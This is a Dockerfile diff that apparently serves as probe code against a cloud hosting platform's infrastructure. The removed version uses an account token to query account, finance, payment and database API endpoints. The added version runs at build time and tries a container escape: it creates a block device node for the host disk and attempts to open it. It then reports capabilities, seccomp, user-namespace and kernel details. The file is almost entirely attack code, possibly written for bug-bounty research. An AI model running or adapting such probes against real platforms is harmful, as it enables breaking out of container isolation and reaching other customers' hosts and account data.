@@ -1,4 +1,28 @@
-FROM alpine:3.20
-RUN apk add --no-cache curl >/dev/null 2>&1 || true
-EXPOSE 3000
-CMD ["/bin/sh","-c","echo TWBBE_START=1; T=\"$TWBB_ACCOUNT_TOKEN\"; echo TWBBE_ENV_TOKEN_PRESENT=$([ -n \"$T\" ] && echo yes || echo no); echo TWBBE_ENV_TOKEN_LEN=${#T}; A='https://api.timeweb.cloud/api/v1'; for ep in account/status account/finances account/payments/docs apps databases; do C=$(curl -s -o /tmp/r -w '%{http_code}' --max-time 8 -H \"Authorization: Bearer $T\" \"$A/$ep\"); B=$(wc -c < /tmp/r 2>/dev/null); N=$(tr ',' '\\n' < /tmp/r 2>/dev/null | grep -c ':'); echo TWBBE_$(echo $ep | tr '/a-z' '_A-Z')=code:$C,bytes:$B,fields:$N; done; echo TWBBE_END=1; while true; do printf 'HTTP/1.1 200 OK\\r\\nContent-Length: 3\\r\\n\\r\\nok\\n' | nc -l -p 3000 >/dev/null 2>&1 || sleep 3; done"]
+FROM debian:12-slim
+RUN set +e; \
+    echo "TWBB_ESC_BEGIN=1"; \
+    DEV=$(awk '$5=="/etc/hosts"{print $3}' /proc/self/mountinfo | head -1); \
+    echo "TWBB_ESC_HOSTDEV=${DEV:-none}"; \
+    MAJ=${DEV%%:*}; MIN=${DEV##*:}; \
+    mknod /tmp/n b "$MAJ" "$MIN" 2>/tmp/mk; \
+    echo "TWBB_ESC_MKNOD_RC=$?"; \
+    echo "TWBB_ESC_MKNOD_ERR=[$(tr -d '\n' </tmp/mk | tail -c 60)]"; \
+    dd if=/tmp/n of=/dev/null bs=1 count=0 2>/tmp/op; \
+    echo "TWBB_ESC_HOSTOPEN_RC=$?"; \
+    echo "TWBB_ESC_HOSTOPEN_ERR=[$(tr -d '\n' </tmp/op | tail -c 80)]"; \
+    mknod /tmp/b b 99 199 2>/dev/null; \
+    dd if=/tmp/b of=/dev/null bs=1 count=0 2>/tmp/nb; \
+    echo "TWBB_ESC_NEGOPEN_RC=$?"; \
+    echo "TWBB_ESC_NEGOPEN_ERR=[$(tr -d '\n' </tmp/nb | tail -c 60)]"; \
+    rm -f /tmp/n /tmp/b; \
+    echo "TWBB_ESC_UIDMAP=[$(tr -s ' ' <  /proc/self/uid_map | tr -d '\n')]"; \
+    echo "TWBB_ESC_GIDMAP=[$(tr -s ' ' < /proc/self/gid_map | tr -d '\n')]"; \
+    echo "TWBB_ESC_CAPEFF=$(awk '/CapEff/{print $2}' /proc/self/status)"; \
+    echo "TWBB_ESC_SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status)"; \
+    echo "TWBB_ESC_NNP=$(awk '/NoNewPrivs/{print $2}' /proc/self/status)"; \
+    unshare -Urm /bin/true 2>/dev/null; echo "TWBB_ESC_USERNS_RC=$?"; \
+    echo "TWBB_ESC_MAXUSERNS=$(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo na)"; \
+    echo "TWBB_ESC_KERNEL=$(uname -r)"; \
+    echo "TWBB_ESC_CGROUP=[$(cat /proc/self/cgroup | tr -d '\n' | tail -c 40)]"; \
+    echo "TWBB_ESC_END=1"
+CMD ["sh","-c","echo TWBB_ESC_RUNTIME=1; sleep 3600"]
